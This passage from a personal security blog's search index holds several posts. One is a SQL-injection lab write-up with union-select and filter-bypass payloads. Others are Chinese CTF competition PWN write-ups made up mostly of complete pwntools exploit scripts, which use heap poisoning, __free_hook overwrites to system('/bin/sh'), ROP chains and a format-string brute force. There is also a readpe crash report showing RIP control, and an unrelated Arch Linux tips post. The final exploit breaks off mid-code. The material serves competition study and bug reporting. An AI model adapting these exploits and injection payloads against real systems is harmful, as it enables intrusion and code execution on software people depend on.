id=&#x27;-1&#x27;\n\n有&#39;包围，属于字符型变量。\n输入\nhttp://222.18.158.243:4602?id=1&#x27;+and+&#x27;1&#x27;=&#x27;-1\n\n无回显，则构造为假成功。\nhttp://222.18.158.243:4602?id=1&#x27;+and+&#x27;1&#x27;=&#x27;-1&#x27;+union+select+&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3\n\n回显\n23\n\n在2,3处可以打印flag。\n最终payload\nhttp://222.18.158.243:4602?id=1&#x27;+and+&#x27;1&#x27;=&#x27;-1&#x27;+union+select+&#x27;1&#x27;,flag,&#x27;3&#x27;+from+flag+where+&#x27;1&#x27;=&#x27;1\n\nsql拼接如下:\nSELECT * FROM `users` WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;-1&#x27; union select &#x27;1&#x27;,flag,&#x27;3&#x27; from flag where &#x27;1&#x27;=&#x27;1&#x27;\n\n\n\n回显如下\nwlgf&#123;only_is_a_sql_23\n\n\n\n\n\nLab3输入\nhttp://222.18.158.243:4603/?id=1\n\nsql语句回显\nSELECT * FROM `users` WHERE id=&#x27;1&#x27;\n\n输入\nhttp://222.18.158.243:4603/?id=5+++++1\n\nsql回显\nSELECT * FROM `users` WHERE id=&#x27;51&#x27;\n\n发现把空格给过滤了\n可以采用:\n一、通过注释绕过空格注释即/**/通过注释取代空格eg：  or/**/&#x27;me&#x27;/**/=/**/&#x27;isme&#x27;二、通过括号绕过空格eg： and(1=0)\n\n\n\n\n\nhttp://222.18.158.243:4603/?id=a&#x27;%a0union%a0select%a01,(select%a0flag%a0from%a0sql_db.flag),3%a0a/**/nd%a0&#x27;1&#x27;=&#x27;1\n\n\n\n\n\n\n\nref: https://blog.csdn.net/tony_jiajia/article/details/80574714\n绕过ref: https://blog.csdn.net/huanghelouzi/article/details/82995313\n","categories":["security"],"tags":["web"]},{"title":"第十四届全国大学生信息安全竞赛初赛PWN部分WP","url":"/2021/05/19/security/ctf/compitation/wp-%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/","content":"第十四届全国大学生信息安全竞赛初赛 PWN部分WPpwny#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;pwny&#x27;libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc-2.27.so&#x27;# remote server ip and porthost = &quot;124.71.233.169:24519&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    int64 = 0xFFFFFFFFFFFFFFFF    sla(&#x27;exit&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(0x100))    sla(&#x27;exit&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(0x100))    # leak libc    sla(&#x27;exit&#x27;, &#x27;1&#x27;)    li(&#x27;cracking...&#x27;)     sa(&#x27;:&#x27;, p64(int((elf.got[&#x27;read&#x27;] - 0x202060) / 8) &amp; int64))    ru(&#x27;Result: &#x27;)    leak = int(ru(&#x27;\\n&#x27;), 16)    libc_base = leak - libc.sym[&#x27;read&#x27;]    li(&#x27;leak:&#x27; + hex(leak))    li(&#x27;libc_base:&#x27; + hex(libc_base))    env = libc_base + libc.sym[&#x27;environ&#x27;]\tog = libc_base + 0x10a41c        # leak elf    sla(&#x27;exit&#x27;, &#x27;1&#x27;)    sa(&#x27;:&#x27;, p64(int(-63) &amp; int64))    ru(&#x27;Result: &#x27;)    leak = int(ru(&#x27;\\n&#x27;), 16)    elf_base = leak - 0x201f80     li(&#x27;leak:&#x27; + hex(leak))    li(&#x27;elf_base:&#x27; + hex(elf_base))    # leak stack    sla(&#x27;exit&#x27;, &#x27;1&#x27;)    sa(&#x27;:&#x27;, p64(int((env - elf_base - 0x202060) / 8) &amp; int64))    ru(&#x27;Result: &#x27;)    leak = int(ru(&#x27;\\n&#x27;), 16)    stack_ret = leak - 0x120    li(&#x27;stack_ret:&#x27; + hex(stack_ret))    # modify stack return    sla(&#x27;exit&#x27;, &#x27;2&#x27;)    sla(&#x27;Index:&#x27;, str(int((stack_ret - elf_base - 0x202060) / 8) &amp; int64))    sleep(0.1)    #db()    s(p64(og))def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    for i in range(1):        if(True):        #try:            if LOCAL:                elf = ELF(elf_path)                if LIBC:                    libc = ELF(libc_path)                io = elf.process()            else:                elf = ELF(elf_path)                io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))                if LIBC:                    libc = ELF(libc_path)            exploit()            finish()        #except:        #    continue\n\n\n\nlonelywolf#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;lonelywolf&#x27;libc_path = &#x27;/glibc/2.29/64/lib/libc.so.6&#x27;# remote server ip and porthost = &quot;124.71.233.169:24178&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad(sz):    sla(&#x27;exit&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(0))    sla(&#x27;:&#x27;, str(sz))def md(d):    sla(&#x27;exit&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(0))    sa(&#x27;:&#x27;, d)def dp():    sla(&#x27;exit&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(0))def rm():    sla(&#x27;exit&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(0))#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # leak heap    ad(0x28)    rm()    p = p64(0) + p64(0)    p += b&#x27;\\n&#x27;    md(p)    rm()    dp()    ru(&#x27;Content: &#x27;)    heap = u64(r(6).ljust(8, b&#x27;\\x00&#x27;))    li(&#x27;heap: &#x27; + hex(heap))    # leak libc    ad(0x58)    rm()    for _ in range(0xa):        ad(0x78)    rm()     ad(0x28)    md(p64(heap + 0x20) + b&#x27;\\n&#x27;) # malloc to our fake chunk    ad(0x28)    ad(0x28)    p  = p64(0) + p64(0x60 + 0x80 * 9 + 1)    p += b&#x27;\\n&#x27;    md(p)    ad(0x58)    rm()    dp()    leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 96    li(&#x27;libc_base: &#x27; + hex(libc_base))    ad(0x38)    rm()    p = p64(0) + p64(0)    p += b&#x27;\\n&#x27;    md(p)    rm()    ad(0x38)    p = p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x8)    p += b&#x27;\\n&#x27;    md(p)    ad(0x38)    ad(0x38) # malloc to free_hook    p = b&#x27;/bin/sh\\x00&#x27; + p64(libc_base + libc.sym[&#x27;system&#x27;])    p += b&#x27;\\n&#x27;    md(p)    db()    rm()    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        io = elf.process()    else:        libc_path = &#x27;./libc-2.27.so&#x27;        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\n\n\nsilverwolf#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;./silverwolf&#x27;#libc_path = &#x27;/glibc/2.27/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc-2.27.so&#x27;# remote server ip and porthost = &quot;124.71.233.169:24460&quot;# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)def ad(sz):    sla(&#x27;exit&#x27;, &#x27;1&#x27;)    sla(&#x27;:&#x27;, str(0))    sla(&#x27;:&#x27;, str(sz))def md(d):    sla(&#x27;exit&#x27;, &#x27;2&#x27;)    sla(&#x27;:&#x27;, str(0))    sa(&#x27;:&#x27;, d)def dp():    sla(&#x27;exit&#x27;, &#x27;3&#x27;)    sla(&#x27;:&#x27;, str(0))def rm():    sla(&#x27;exit&#x27;, &#x27;4&#x27;)    sla(&#x27;:&#x27;, str(0))def clean():    for i in range(0x10):        ad(0x10)    for i in range(0x10):        ad(0x20)    for i in range(0x10):        ad(0x30)    for i in range(0x3):        ad(0x50)    for i in range(0xc):        ad(0x60)    for i in range(0x8):        ad(0x70)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    clean()    ad(0x28) # for align    # leak heap    ad(0x28)    rm()    p = p64(0) + p64(0)    p += b&#x27;\\n&#x27;    md(p)    rm()    dp()    ru(&#x27;Content: &#x27;)    heap = u64(r(6).ljust(8, b&#x27;\\x00&#x27;))    li(&#x27;heap: &#x27; + hex(heap))    # leak libc    li(&#x27;leak libc&#x27;)    ad(0x58)    rm()    for _ in range(0xa):        ad(0x78)    rm()     ad(0x28)    md(p64(heap + 0x20) + b&#x27;\\n&#x27;) # malloc to our fake chunk    ad(0x28)    ad(0x28)    p  = p64(0) + p64(0x60 + 0x80 * 9 + 1)    p += b&#x27;\\n&#x27;    md(p)    ad(0x58)    rm()    li(&#x27;dumping libc&#x27;)    dp()    leak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)    libc_base = leak - libc.sym[&#x27;__malloc_hook&#x27;] - 0x10 - 96    li(&#x27;libc_base: &#x27; + hex(libc_base))    setcontext = libc_base + 0x521B5     libc_ret = libc_base + 0x8aa    pop_rdi = libc_base + 0x00000000000215bf  #: pop rdi ; ret    pop_rdx_rsi = libc_base + 0x0000000000130569 #: pop rdx ; pop rsi ; ret    open_ = libc_base + libc.sym[&#x27;openat&#x27;]    read_ = libc_base + libc.sym[&#x27;read&#x27;]    write_ = libc_base + libc.sym[&#x27;write&#x27;]    pop_rax = libc_base + 0x0000000000043ae8 # pop rax ; ret    syscall = libc_base + 0x1101e2    pop_rsp = libc_base + 0x0000000000003960 # pop rsp ; ret    ad(0x78) # for align    ad(0x68) # for return    rm()    ad(0x58) # for our     p = b&#x27;\\x11&#x27; * 0x30    p += p64(heap + 0x160) # rsp    p += p64(libc_ret) # rcx ret    p += b&#x27;\\n&#x27;    md(p)    ad(0x58) # for return    p = b&#x27;\\x11&#x27; * 0x57    p += b&#x27;\\n&#x27;    md(p)    ad(0x78)     p =  p64(pop_rdi) + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x8)    p += p64(pop_rdx_rsi) + p64(0) + p64(0)    p += p64(pop_rax) + p64(2)    p += p64(syscall)    p += p64(pop_rdi) + p64(3)    p += p64(pop_rsp) + p64(heap + 0x160 + 0x90 - 0x10)    p += b&#x27;\\n&#x27;    md(p) # our rop    ad(0x78)     p = p64(pop_rdx_rsi) + p64(0x100) + p64(heap)    p += p64(pop_rax) + p64(0)    p += p64(syscall)    p += p64(pop_rax) + p64(1)    p += p64(pop_rdi) + p64(1)    p += p64(syscall)    p += b&#x27;\\n&#x27;    md(p) # our rop    # modify free_hook    ad(0x78)    rm()    p = p64(0) + p64(0)    p += b&#x27;\\n&#x27;    md(p)    rm()    ad(0x78)    p = p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] - 0x8)    p += b&#x27;\\n&#x27;    md(p)    ad(0x78)    li(&#x27;get shell&#x27;)    ad(0x78) # malloc to free_hook    p = b&#x27;./flag\\x00\\x00&#x27; + p64(setcontext)    p += b&#x27;\\n&#x27;    md(p)    ad(0x68)    db()    rm()def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    if LOCAL:        elf = ELF(elf_path)        if LIBC:            libc = ELF(libc_path)        #io = elf.process()        io = process(elf_path, env = &#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125; )    else:        libc_path = &#x27;./libc-2.27.so&#x27;        elf = ELF(elf_path)        io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))        if LIBC:            libc = ELF(libc_path)    exploit()    finish()\n\n\n\n\n\nchannel#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./channel&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;124.71.233.169&quot;server_port = 24130# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)    return pdef reg(k):    sla(&#x27;&gt;&#x27;, &#x27;1&#x27;)    sa(&#x27;&gt;&#x27;, k)def unreg(k):    sla(&#x27;&gt;&#x27;, &#x27;2&#x27;)    sa(&#x27;&gt;&#x27;, k)def rd(k):    sla(&#x27;&gt;&#x27;, &#x27;3&#x27;)    sa(&#x27;&gt;&#x27;, k)def wt(k, l, d):    sla(&#x27;&gt;&#x27;, &#x27;4&#x27;)    sa(&#x27;&gt;&#x27;, k)    sla(&#x27;&gt;&#x27;, str(l))    sa(&#x27;&gt;&#x27;, d)def db_exit(k):    sla(&#x27;&gt;&#x27;, &#x27;4&#x27;)    sa(&#x27;&gt;&#x27;, k)    sla(&#x27;&gt;&#x27;, str(0x400))DEBUG = 1#--------------------------exploit--------------------------def exploit(n):    li(&#x27;exploit...&#x27;)    for i in range(0x9):        reg(str(i))    reg(&#x27;A\\x00&#x27;)    reg(&#x27;B\\x00&#x27;)    reg(&#x27;C\\x00&#x27;)    reg(&#x27;D\\x00&#x27;)    reg(&#x27;DEBUG\\x00&#x27;)    #rd(&#x27;B\\x00&#x27;)    unreg(&#x27;A\\x00&#x27;) # bin: A    unreg(&#x27;B\\x00&#x27;) # bin: B-&gt;A    wt(&#x27;C\\x00&#x27;, 0x110, b&#x27;A&#x27; * (0x100 - 1) + b&#x27;\\x01&#x27;) # fake reg_buf, bin: A    rd(&#x27;C\\x00&#x27;)    ru(&#x27;\\x01&#x27;)    # leak heap    leak = u64(ru(&#x27;\\n&#x27;).ljust(8, b&#x27;\\x00&#x27;))    li(&#x27;leak: &#x27; + hex(leak))    heap = leak + 0x4000000000    li(&#x27;heap: &#x27; + hex(heap))    unreg(b&#x27;A&#x27; * 0xff + b&#x27;\\x01&#x27;) # free    wt(&#x27;C\\x00&#x27;, 0x110, b&#x27;\\x01&#x27; * 1) # fake reg_buf    rd(&#x27;C\\x00&#x27;)    # leak libc    for i in range(8): # tbin: 5-&gt;4-&gt;3-&gt;2-&gt;1-&gt;0-&gt;A, unsorted bin: 6        unreg(str(7 - i))    for i in range(7):        wt(&#x27;C\\x00&#x27;, 0x110, &#x27;\\xAA&#x27; * 8)    #wt(&#x27;D\\x00&#x27;, 0x110, &#x27;\\x02&#x27; * 8)    wt(&#x27;D\\x00&#x27;, 0x110, &#x27;\\x02&#x27; * 8)    rd(&#x27;D\\x00&#x27;)    ru(&#x27;\\x02&#x27; * 8)    leak = u64(ru(&#x27;\\n&#x27;).ljust(8, b&#x27;\\x00&#x27;))    li(&#x27;leak: &#x27; + hex(leak))    libc_base = 0x4000000000 + leak - (0x9e6ac0 - 0x879000)    li(&#x27;libc_bsse: &#x27; + hex(libc_base))    li(&#x27;__malloc_hook: &#x27; + hex(libc.sym[&#x27;__malloc_hook&#x27;]))    li(&#x27;exit: &#x27; + hex(libc.sym[&#x27;exit&#x27;]))    # modify fd    reg(b&#x27;A&#x27;)    reg(b&#x27;B&#x27;)    p =p64(0) + p64(0x141) # heap + 0x820    p = p.ljust(0x110, b&#x27;\\x00&#x27;)    wt(&#x27;A&#x27;, 0x110, p)    reg(b&#x27;C&#x27;)    reg(b&#x27;/bin/sh&#x27;)    reg(&#x27;DEBUG\\x00&#x27;)         unreg(b&#x27;A&#x27;) # for modified the fd    unreg(b&#x27;B&#x27;) # for modified the fd    unreg(b&#x27;C&#x27;) # bin: C -&gt; B -&gt; A    p = b&#x27;C&#x27;    p = p.ljust(0x100, b&#x27;\\x00&#x27;)    p += p64(heap + 0x830)    wt(&#x27;/bin/sh&#x27;, 0x110, p)    unreg(&#x27;\\x00&#x27;)    unreg(&#x27;C&#x27;)    free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]    p = b&#x27;\\x11&#x27; * 0x100    p += p64(0) + p64(0x122)    p += p64(free_hook)    wt(&#x27;/bin/sh&#x27;, 0x138, p) # malloc to our 0x140, modify next fd as our target    li(&#x27;malloc to free_hook&#x27;)    li(&#x27;__free_hook: &#x27; + hex(free_hook))    reg(p64(free_hook)) # C        p = p64(libc_base + libc.sym[&#x27;system&#x27;])    wt(&#x27;/bin/sh&#x27;, 0x110, p) # malloc to our 0x140, modify next fd as our target    unreg(&#x27;/bin/sh&#x27;)    &#x27;&#x27;&#x27;    if(DEBUG):        db_exit(&#x27;DEBUG\\x00&#x27;)    &#x27;&#x27;&#x27;def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    for n in range(0x1):        if True:            li(&#x27;round: &#x27; + str(n))            elf = ELF(elf_path)            if LOCAL:                if LIBC:                    libc = ELF(libc_path)                    if(DEBUG):                        io = process([&#x27;./qemu-aarch64-static&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])                    else:                        io = process([&#x27;./qemu-aarch64-static&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])                else:                    #io = process([&#x27;./qemu-aarch64-static&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])                    io = process([&#x27;./qemu-aarch64-static&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;.&#x27;, elf_path])            else:                io = remote(server_ip, server_port)                if LIBC:                    libc = ELF(libc_path)            exploit(n)            finish()        &#x27;&#x27;&#x27;        except:            c()            continue        &#x27;&#x27;&#x27;\n\n\n\n\n\n\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"readpe crashed when I use -e","url":"/2021/05/17/security/bug/pev-report/","content":"readpe crashed when I use -eDescribe the bug*In readpe newst version, Analysing abnormal test.exe will crash this program, And the version 0.70 can modify the RIP regester.\nThe test.exe download: https://github.com/I0gan/files/raw/main/pev/test.exe\nversion 0.70 test:[i0gan@arch build]$ /bin/readpe -e ./test.exe Exported functionsSegmentation fault (core dumped)\n\nI use gdb to debugger this program,the rip regester can be set as 0\npwndbg&gt; set args -e test.exepwndbg&gt; startTemporary breakpoint 1 at 0x403966pwndbg&gt; [Thread debugging using libthread_db enabled]Using host libthread_db library &quot;/usr/lib/libthread_db.so.1&quot;.Temporary breakpoint 1, 0x0000000000403966 in main ()cContinuing.Exported functionsProgram received signal SIGSEGV, Segmentation fault.0x0000000000000000 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────*RAX  0x0 RBX  0x403dd0 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp*RCX  0x0*RDX  0x5*RDI  0x7fffffffde60 —▸ 0x403dd0 (__libc_csu_init) ◂— mov    qword ptr [rsp - 0x28], rbp*RSI  0xa00*R8   0x608480 ◂— 0x608*R9   0x7ffff7f0c0c0 (step3a_jumps) ◂— 0x0*R10  0xfffffffffffffb87*R11  0x206 R12  0x401070 (_start) ◂— xor    ebp, ebp R13  0x0 R14  0x0 R15  0x0*RBP  0x0*RSP  0x7fffffffde40 ◂— 0x0*RIP  0x0──────────────────────────────────────────[ DISASM ]──────────────────────────────────────────Invalid address 0x0\n\nIn newst verion:\ntest[i0gan@arch build]$ ./readpe -e ./test.exe Exported functions    Library        Name:                            MZ�ִ�Ǿ        FunctionsSegmentation fault (core dumped)\n\n","categories":["security"],"tags":["bug"]},{"title":"ArchLinux常见问题","url":"/2021/05/12/env/linux/myarch/issues/","content":"关闭峰铃临时的方案sudo rmmod pcspkr\n\n对于CentOS&#x2F;Redhat&#x2F;RHEL&#x2F;Fedora系统，使用root身份执行：\nrmmod pcspkr\n\n一劳永逸的方案sudo echo &quot;blacklist pcspkr&quot; &gt;&gt;/etc/modprobe.d/blacklist\n\n对于CentOS&#x2F;Redhat&#x2F;RHEL&#x2F;Fedora系统，使用root身份执行：\necho &quot;alias pcspkr off&quot; &gt;&gt;/etc/modprobe.conf\n\n还有另外一种方法，就是在&#x2F;etc&#x2F;inputrc文件中把\nset bell-style none\n\n\n前的注释去掉,改为\nset bell-style off\n\n\n\ngrub找不到 windows系统grub找不到windows问题，是grub没有自动找到windows的efi文件，需要手动修改grub配置文件，将以下加入&#x2F;boot&#x2F;grub&#x2F;grub.cfg中:\n其中3C4E8E974E8E4A1A是windows efi所在的分区uuid，可以通过 sudo blkid来查看\n### BEGIN /etc/grub.d/30_os-prober ###menuentry &#x27;Windows Boot Manager (on /dev/nvme0n1p2)&#x27; --class windows --class os $menuentry_id_option &#x27;osprober-efi-3C4E8E974E8E4A1A&#x27; &#123;\tinsmod part_gpt\tinsmod fat\tif [ x$feature_platform_search_hint = xy ]; then\t  search --no-floppy --fs-uuid --set=root  3C4E8E974E8E4A1A\telse\t  search --no-floppy --fs-uuid --set=root 3C4E8E974E8E4A1A\tfi\tchainloader /efi/Microsoft/Boot/bootmgfw.efi&#125;### END /etc/grub.d/30_os-prober ###\n\nplymouthd占用cpu问题您不需要太卸载，只需禁用它即可。在终端中尝试执行以下操作：\nsudo nano &#x2F;etc&#x2F;default&#x2F;grub寻找：\nGRUB_CMDLINE_LINUX_DEFAULT&#x3D;”quiet splash”也更改它：\nGRUB_CMDLINE_LINUX_DEFAULT&#x3D;”quiet”并更新Grub（请务必小心，如果断电或出现故障，可能会中断启动）：\nsudo update-grub\n亮度问题我们知道调整屏幕亮度在硬件层面就是调整LED灯的功率大小，在linux里面通过acpi（高级配置与电源接口）来控制，具体是通过设置**/sys/class/backlight/%k/brightness**来实现的，当然手动调节这个文件的数值是可行的，但是并不是很方便。所以安装ACPI的亮度控制取代xbacklight的功能：\nsudo pacman -S acpilight\n\n将当前用户加入 video 组，实现免 root 控制亮度：\nsudo gpasswd video -a 用户名\n\nacpilight 兼容 xbacklight 重启之后就可以通过下面命令控制亮度了：\n# 获得当前亮度xbacklight -get# 设置亮度xbacklight -set 70# 增加亮度xbacklight -inc 10# 降低亮度xbacklight -dec 10\n\n\n\n合盖不休眠设置sudo vim /etc/systemd/logind.conf把 HandleLidSwitch 的参数改为 lock, 并去掉前面的注释#sudo systemctl restart systemd-logind\n","categories":["env"],"tags":["linux"]},{"title":"第六届全国网络空间安全技术大赛PWN WP","url":"/2021/05/05/security/ctf/compitation/wp-%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B/","content":"bank密码为随机值，若密码第一个字节为’\\x00’时，若我们输入为’\\x00’，则两个相等，所以输入’\\x00’，成功几率为1 &#x2F;256，在通过格式化字符串漏洞将堆中的flag打印出来即可。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;bank&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;81.70.195.166:10000&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    p = &#x27;A&#x27;    sla(&#x27;:&#x27;, p)    sl(&#x27;\\x00&#x27;)    ru(&#x27;?&#x27;)    sl(&#x27;yes&#x27;)    #db()    sl(&#x27;%8$s&#x27;)    def finish():    ia()    c()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:    for i in range(255):        try:            if LOCAL:                elf = ELF(elf_path)                if LIBC:                    libc = ELF(libc_path)                io = elf.process()            else:                elf = ELF(elf_path)                io = remote(host.split(&#x27;:&#x27;)[0], int(host.split(&#x27;:&#x27;)[1]))                if LIBC:                    libc = ELF(libc_path)            exploit()            finish()        except:            continue\n\nauto先采用angr来 fuzz找到进入login_again函数的输入\nangr脚本如下:\nimport angrfrom binascii import b2a_heximport loggingimport syslogging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;INFO&#x27;)#logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;CRITICAL&#x27;)def angr_main():    pj = angr.Project(&#x27;./auto&#x27;)    state = pj.factory.entry_state()    simgr = pj.factory.simgr(state)    simgr.explore(find = 0x0804867E) # call login_again    p = simgr.found[0].posix.dumps(0)    print(b2a_hex(p).decode(), end=&#x27;&#x27;)angr_main()\n\nlogin_again就是个堆栈溢出了，留有后面，直接跳到后门函数。\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#context.arch = &#x27;amd64&#x27;elf_path  = &#x27;auto&#x27;libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc.so.6&#x27;# remote server ip and porthost = &quot;81.70.195.166:10001&quot;# if local debugLOCAL = 0LIBC  = 0#--------------------------func-----------------------------def db():    if(LOCAL):        gdb.attach(io)#--------------------------exploit--------------------------def exploit():    li(&#x27;exploit...&#x27;)    # 55 58 59 55 4b 56 4e 5a    p = &#x27;\\x55\\x58\\x59\\x55\\x4b\\x56\\x4e\\x5a&#x27;    s(p)    #db()    p = b&#x27;\\x00&#x27; * 